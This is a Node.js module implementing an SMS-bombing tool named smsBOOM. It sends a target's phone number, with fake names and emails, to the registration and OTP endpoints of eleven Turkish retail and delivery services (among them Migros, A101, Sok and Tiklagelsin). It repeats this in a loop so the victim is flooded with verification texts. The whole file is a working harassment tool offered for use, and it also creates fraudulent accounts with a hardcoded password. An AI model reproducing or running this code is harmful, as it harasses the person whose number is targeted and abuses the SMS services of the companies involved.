const request = require('request');
const colors = require('colors');
const title = require('./title.js');
const moment = require('moment');
const faker = require('faker');

async function delay(s) { return new Promise(resolve => setTimeout(resolve, s * 1000)); }

async function smsBOOM(number, amount) {
    let smsData = {
        start_date: moment().format('DD.MM.YYYY HH:mm:ss'),
        number: number,
        failed: 0,
        successful: 0,
    };

    function registerKigili(no) {
        request.post({
            url: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0" + no,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                smsData.successful++;
                console.log(`[+] Kigili - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Kigili - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function sendSmsKahveDunyasi(no) {
        request.post({
            url: 'https://core.kahvedunyasi.com/api/users/sms/send',
            form: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Kahve Dunyasi - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Kahve Dunyasi - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function registerNaosstars(no) {
        request.post({
            url: 'https://shop.naosstars.com/users/register',
            form: {
                "email": faker.internet.email(),
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "date_of_birth": "1999-01-01",
                "phone": "0" + no,
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                smsData.successful++;
                console.log(`[+] Naosstars - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Naosstars - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function registerWMF(no) {
        request.post({
            url: 'https://www.wmf.com.tr/users/register/',
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.name.firstName(),
                "gender": "male",
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "phone": "0" + no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                smsData.successful++;
                console.log(`[+] WMF - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] WMF - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function loginBim(no) {
        request.post({
            url: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: {
                "phone": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Bim - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Bim - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function sendSmsSok(no) {
        request.post({
            url: 'https://api.ceptesok.com:443/api/users/sendsms',
            json: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Sok - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Sok - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function sendSmsMigros(no) {
        request.post({
            url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
            json: {
                "phoneNumber": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Migros - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Migros - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function loginA101(no) {
        request.post({
            url: 'https://www.a101.com.tr:443/users/otp-login/',
            json: {
                "phone": "0" + no,
                "next": "/a101-kapida"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] A101 - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] A101 - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function registerEnglishhome(no) {
        request.post({
            url: 'https://www.englishhome.com:443/enh_app/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0" + no,
                "password": "nwejkfıower32",
                "email_allowed": "true",
                "sms_allowed": "true",
                "confirm": "true",
                "tom_pay_allowed": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Englishhome - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Englishhome - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function registerSakasu(no) {
        request.post({
            url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
            form: {
                "phone": "0" + no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Sakasu - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Sakasu - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function sendSmsTiklagelsin(no) {
        request.post({
            url: 'https://www.tiklagelsin.com/user/graphql',
            headers: {
                "accept": "*/*",
                "accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/json",
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-device-type": "3",
                "x-merchant-type": "0",
                "x-no-auth": "true",
                "Referer": "https://www.tiklagelsin.com/a/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            body: JSON.stringify({
                "operationName": "GENERATE_OTP",
                "variables": {
                    "phone": "+90" + no,
                    "challenge": "85033055-4b81-4f6f-aed2-4a8ee1dce968",
                    "deviceUniqueId": "web_6f59c0e5-3a0a-4bd3-907d-3cd973152333"
                },
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
            }),
            method: "POST"
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                smsData.successful++;
                console.log(`[+] Tıkla Gelsin - ${no} - ${smsData.successful}`.green);
            } else {
                smsData.failed++;
                console.log(`[-] Tıkla Gelsin - ${no} - ${smsData.failed}`.red);
            }
            title(`Phone: ${number} - Amount: ${amount} - Successful: ${smsData.successful} - Failed: ${smsData.failed}`);
        });
    }

    function send(no) {
        registerKigili(no);
        sendSmsKahveDunyasi(no);
        registerNaosstars(no);
        registerWMF(no);
        loginBim(no);
        sendSmsSok(no);
        sendSmsMigros(no);
        loginA101(no);
        registerEnglishhome(no);
        registerSakasu(no);
        sendSmsTiklagelsin(no);
    }

    for (let i = 0; i < amount; i++) {
        await delay(5);
        send(number);
    }
}

module.exports = smsBOOM;
